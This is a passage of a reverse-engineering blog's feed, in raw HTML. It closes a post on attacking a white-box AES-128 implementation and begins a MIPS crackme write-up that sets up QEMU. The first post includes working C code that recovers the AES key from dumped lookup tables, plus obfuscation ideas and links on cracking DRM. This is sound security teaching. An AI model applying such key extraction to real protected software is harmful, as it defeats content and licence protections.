<span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">|</span> <span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Last round which is a bit different</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Tboxes_</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s cute isn&rsquo;t it?</p>

<h1>Attacking the white-box: extract the key</h1>

<p>As the title says, this white-box implementation is really insecure: which means that if you have access to an executable with that kind of white-box you just have to extract <code>Tyboxes[0]</code> &amp; do a little magic to extract the key.</p>

<p>If it&rsquo;s not already obvious to you, you just have to remember how we actually compute the values inside that big tables ; look carefully at those two lines:</p>

<figure class='code'><figcaption><span>Tyboxes generation core</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[</span><span class="n">x</span> <span class="o">^</span> <span class="n">round_keys</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">]];</span>
</span><span class='line'><span class="n">Tyboxes</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="n">c</span><span class="p">];</span>
</span></code></pre></td></tr></table></div></figure>


<p>In our case, <code>r</code> is 0, <code>i</code> will be the byte index of the round key 0 (which is the AES key) &amp; we can also set <code>x</code> to a constant value: let&rsquo;s say 0 or 1 for instance. <code>S_box</code> is known, <code>Ty</code> too as this transformation is always the same (it doesn&rsquo;t depend on the key). Basically we just need to brute-force <code>round_keys[r][i]</code> with every values a byte can take. If the computed value is equal to the one in the dumped <code>Tyboxes</code>, then we have extracted one byte of the round key &amp; we can go find the next one.</p>

<p>Attentive readers noticed that we are not going to actually extract the encryption key per-se, but <code>ShiftRows(key)</code> instead (remember that we needed to apply this transformation to build our white-box). But again, <code>ShiftRows</code> being not key-dependent we can invert this operation easily to really have  the plain encryption key this time.</p>

<p>Here is the code that does what I just described:</p>

<figure class='code'><figcaption><span>wbaes128_attack_the_boxes.c:main</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">// unsigned char c = S_box[0 ^ X0];</span>
</span><span class='line'>    <span class="c1">// Tyboxes[0][0][0] = Ty[0][c];</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Tyboxes_round0_dumped</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>    <span class="c1">// Now we generate the 0x100 possible values for the character 0 &amp; wait to find a match</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[</span><span class="mi">1</span> <span class="o">^</span> <span class="n">j</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">computed_value</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="n">c</span><span class="p">];</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">computed_value</span> <span class="o">==</span> <span class="n">value</span><span class="p">)</span>
</span><span class='line'>            <span class="n">scrambled_key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tmp1</span><span class="p">,</span> <span class="n">tmp2</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// 8-bits right rotation of the second line</span>
</span><span class='line'>    <span class="n">tmp1</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">13</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// 16-bits right rotation of the third line</span>
</span><span class='line'>    <span class="n">tmp1</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>    <span class="n">tmp2</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp2</span><span class="p">;</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// 24-bits right rotation of the last line</span>
</span><span class='line'>    <span class="n">tmp1</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span>
</span><span class='line'>    <span class="n">scrambled_key</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Key successfully extracted &amp; UnShiftRow&#39;d:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x%.2x&quot;</span><span class="p">,</span> <span class="n">scrambled_key</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<h1>Obfuscating it?</h1>

<p>This is basically the part where you have no limits, where you can exercise your creativity &amp; develop stuff. I&rsquo;ll just talk about ideas &amp; obvious things, a lot of them are directly taken from <a href="https://twitter.com/elvanderb">@elvanderb</a>&rsquo;s challenge so I guess I owe him yet another beer.</p>

<p>The first things you can do for free are:</p>

<ul>
<li>Unrolling the implementation to make room for craziness</li>
<li>Use public LLVM passes on the unrolled implementation to make it even more crazy

<ul>
<li><a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/kryptonite/llvm-functionpass-kryptonite-obfuscater.cpp">Kryptonite</a></li>
<li>Quarklab&rsquo;s <a href="https://github.com/quarkslab/llvm-passes">ones</a></li>
<li><a href="https://github.com/obfuscator-llvm/obfuscator">Ollvm</a></li>
<li>Build yours!</li>
</ul>
</li>
</ul>


<p>The other good idea is to try to make less obvious key elements in your implementation: basically the AES state, the tables &amp; their structures. Those three things give away quite some important information about how your implementation works, so making a bit harder to figure those points out is good for us. Instead of storing the AES state inside a contiguous memory area of 16 bytes, why not use 16 non-contiguous variables of 1 byte? You can go even further by using different variables for every round to make it even more confusing.</p>

<p>You can also apply that same idea to the different arrays our implementation uses: do not store them in a contiguous memory area, dispatch them all over the memory &amp; transform them in one dimension arrays instead.</p>

<p>We could also imagine a generic array &ldquo;obfuscation&rdquo; where you add several &ldquo;layers&rdquo; before reaching the value you are interested in:</p>

<ul>
<li>Imagine an array <code>[1,5,10,11]</code> ; we could shuffle this one into <code>[10, 5, 1, 11]</code> and build the associated index table which would be <code>[2, 1, 0, 3]</code></li>
<li>And now instead of accessing directly the first array, you retrieve the correct index first in the index table, <code>shuffled[index[0]]</code>

<ul>
<li>Obviously you could have as many indirections you want</li>
</ul>
</li>
</ul>


<p>To make everything always more confusing, we could build the primitives we need on top of crazy CPU extensions like SSE or MMX; or completely build a virtual software-processor..!</p>

<p>Do also try to shuffle everything that is &ldquo;shufflable&rdquo; ; here is simple graph that shows data-dependencies between the lines of our unrolled C implementation (an arrow from A to B means that A needs to be executed prior to B):</p>

<p><img class="center" src="http://doar-e.github.io/images/spotlight_on_an_unprotected_aes128_white-box_implementation/aes.svg"></p>

<p>From here, you have everything you need to move the lines around &amp; generate a &ldquo;less normal&rdquo; implementation (even that we can clearly see what I call synchronization points at the end of every round which is basically the calls to <code>ShiftRows(out)</code> ; but again we could get rid of those, and directly in-lining them etc):</p>

<figure class='code'><figcaption><span>generate_dependency_graph.py:generate_shuffled_implementation_via_dependency_graph</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">generate_shuffled_implementation_via_dependency_graph</span><span class="p">(</span><span class="n">dependency_graph</span><span class="p">,</span> <span class="n">out_filename</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;This function is basically leveraging the graph we produced in the previous function</span>
</span><span class='line'><span class="sd">    to generate an actual shuffled implementation of the AES white-box without breaking any</span>
</span><span class='line'><span class="sd">    constraints, keeping the result of this new shuffled function the same as the clean version.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">lines</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;aes_unrolled_code.raw.clean.unique_aabbccdd&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39; &gt; Finding the bottom of the graph..&#39;</span>
</span><span class='line'>    <span class="n">last_nodes</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">)):</span>
</span><span class='line'>        <span class="n">_</span><span class="p">,</span> <span class="n">degree_o</span> <span class="o">=</span> <span class="n">dependency_graph</span><span class="o">.</span><span class="n">degree_iter</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">indeg</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="n">outdeg</span> <span class="o">=</span> <span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">degree_o</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>            <span class="n">last_nodes</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">dependency_graph</span><span class="o">.</span><span class="n">get_node</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">last_nodes</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39; &gt; Good, check it out: </span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">last_nodes</span>
</span><span class='line'>    <span class="n">shuffled_lines</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="n">step_n</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39; &gt; Lets go&#39;</span>
</span><span class='line'>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">last_nodes</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;  </span><span class="si">%.2d</span><span class="s">&gt; Shuffle </span><span class="si">%d</span><span class="s"> nodes / lines..&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">step_n</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">last_nodes</span><span class="p">))</span>
</span><span class='line'>        <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">last_nodes</span><span class="p">),</span> <span class="n">random</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">)</span>
</span><span class='line'>        <span class="n">shuffled_lines</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">get_name</span><span class="p">())]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">last_nodes</span><span class="p">)</span>
</span><span class='line'>        <span class="n">step_n</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;  </span><span class="si">%.2d</span><span class="s">&gt; Finding parents / stepping back ..&#39;</span> <span class="o">%</span> <span class="n">step_n</span>
</span><span class='line'>        <span class="n">tmp</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">last_nodes</span><span class="p">:</span>
</span><span class='line'>            <span class="n">tmp</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">dependency_graph</span><span class="o">.</span><span class="n">in_neighbors</span><span class="p">(</span><span class="n">node</span><span class="p">))</span>
</span><span class='line'>        <span class="n">last_nodes</span> <span class="o">=</span> <span class="n">tmp</span>
</span><span class='line'>        <span class="n">step_n</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">shuffled_lines</span> <span class="o">=</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">shuffled_lines</span><span class="p">)</span>
</span><span class='line'>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">out_filename</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;&#39;&#39;void aes128_enc_wb_final_unrolled_shuffled_</span><span class="si">%d</span><span class="s">(unsigned char in[16], unsigned char out[16])</span>
</span><span class='line'><span class="s">{</span>
</span><span class='line'><span class="s">memcpy(out, in, 16);</span>
</span><span class='line'><span class="s">&#39;&#39;&#39;</span> <span class="o">%</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">))</span>
</span><span class='line'>        <span class="n">f</span><span class="o">.</span><span class="n">writelines</span><span class="p">(</span><span class="n">shuffled_lines</span><span class="p">)</span>
</span><span class='line'>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;}&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">shuffled_lines</span>
</span></code></pre></td></tr></table></div></figure>


<p>Anyway, I wish I had time to implement what we just talked about but I unfortunately don&rsquo;t; if you do feel free to shoot me an email &amp; I&rsquo;ll update the post with links to your code :&ndash;).</p>

<h1>Last words</h1>

<p>I hope this little post gave you enough to understand how white-box cryptography kind of works, how important is the design of the implementation and what sort of problems you can encounter. If you enjoyed this subject, here is a list of cool articles you may want to check out:</p>

<ul>
<li><a href="http://www.whiteboxcrypto.com/files/2012_misc.pdf">White-box cryptography: hiding keys in software</a></li>
<li><a href="https://www.youtube.com/watch?v=om5AVTqB5bA">White-Box Cryptography &ndash; 30c3</a></li>
<li><a href="http://esec-lab.sogeti.com/dotclear/public/publications/10-hitbkl-drm.pdf">Digital content protection: How to crack DRM and make them more resistant</a></li>
<li><a href="https://github.com/mimoo/whiteboxDES">A white-box DES (Chow et al)</a></li>
</ul>


<p>Every source file produced for this post has been posted on my <a href="https://github.com/0vercl0k">github</a> account right here: <a href="https://github.com/0vercl0k/stuffz/blob/master/wbaes_attack/wbaes128">wbaes128</a>.</p>

<p>Special thanks to my mate <a href="https://twitter.com/__x86">@__x86</a> for proof-reading!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Taming a wild nanomite-protected MIPS binary with symbolic execution: No Such Crackme]]></title>
    <link href="http://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme/"/>
    
    <updated>2014-10-11T21:35:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme</id>
    
    <content type="html"><![CDATA[<p>As last year, the French conference <a href="http://www.nosuchcon.org/#challenge">No Such Con</a> returns for its second edition in Paris from the 19th of November until the 21th of November. And again, the brilliant <a href="https://twitter.com/elvanderb">Eloi Vanderbeken</a> &amp; his mates at <a href="http://synacktiv.fr/en/index.html">Synacktiv</a> put together a series of three security challenges especially for this occasion.
Apparently, the three tasks have already been <a href="https://twitter.com/Synacktiv/status/515174845844582401">solved</a> by awesome <a href="https://twitter.com/0xf4b">@0xfab</a> which won the competition, hats off :).</p>

<p>To be honest I couldn&rsquo;t resist to try at least the first step, as I know that <a href="https://twitter.com/elvanderb">Eloi</a> always builds <a href="http://0vercl0k.tuxfamily.org/bl0g/?p=253">really twisted</a> and <a href="http://www.nosuchcon.org/2013/#challenge">nice binaries</a> ; so I figured I should just give it a go!</p>

<p>But this time we are trying something different though: this post has been co-authored by both <em>Emilien Girault</em> (<a href="https://twitter.com/emiliengirault">@emiliengirault</a>) and I. As we have slightly different solutions, we figured it would be a good idea to write those up inside a single post. This article starts with an introduction to the challenge and will then fork, presenting my solution and his.</p>

<p>As the article is quite long, here is the complete table of contents:</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>REcon: Here be dragons</h1>

<p>This part is just here to get things started: how to have a debugging environment, to know a bit more about MIPS and to know a bit more what the binary is actually doing.</p>

<h2>MIPS 101</h2>

<p>The first interesting detail about this challenge is that it is a MIPS binary ; it&rsquo;s really kind of exotic for me. I&rsquo;m mainly looking at Intel assembly, so having the opportunity to look at an unknown architecture is always appealing. You know it&rsquo;s like discovering a new little toy, so I just couldn&rsquo;t help myself &amp; started to read the MIPS basics.</p>

<p>This part is going to describe only the essential information you need to both understand and crack wide open the binary ; and as I said I am not a MIPS expert, at all. From what I have seen though, this is fairly similar to what you can see on an Intel x86 CPU:</p>

<ul>
<li>It is <a href="https://en.wikipedia.org/wiki/Endianness#Little-endian">little endian</a> (note that it also exists a big-endian version but it won&rsquo;t be covered in this post),</li>
<li>It has way more general purpose registers,</li>
<li>The calling convention is similar to <a href="http://msdn.microsoft.com/fr-fr/library/6xa169sk.aspx">__fastcall</a>: you pass arguments via registers, and get the return of the function in <em>$v0</em>,</li>
<li>Unlike <a href="https://en.wikipedia.org/wiki/X86">x86</a>, MIPS is <a href="https://en.wikipedia.org/wiki/Reduced_instruction_set_computing">RISC</a>, so much simpler to take in hand (trust me on that one),</li>
<li>Of course, there is an IDA processor,</li>
<li>Linux and the regular tools also exists for MIPS so we will be able to use the &ldquo;normal&rdquo; tools we are used to use,</li>
<li>It also uses a stack, much less than x86 though as most of the things happening are in registers (in the challenge at least).</li>
</ul>


<h2>Setting up a proper debugging environment</h2>

<p>The answer to that question is <a href="http://wiki.qemu.org/Main_Page">Qemu</a>, as expected. You can even download already fully prepared &amp; working Debian images on <a href="https://people.debian.org/~aurel32/qemu/mipsel/">aurel32</a>&rsquo;s website.</p>

<figure class='code'><figcaption><span>get a working qemu environment</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overclok@wildout:~/chall/nsc2014<span class="nv">$ </span>wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
</span><span class='line'>overclok@wildout:~/chall/nsc2014<span class="nv">$ </span>wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
</span><span class='line'>overclok@wildout:~/chall/nsc2014<span class="nv">$ </span>cat start_vm.sh
</span><span class='line'>qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -vga none -append <span class="s2">&quot;root=/dev/sda1 console=tty0&quot;</span> -nographic
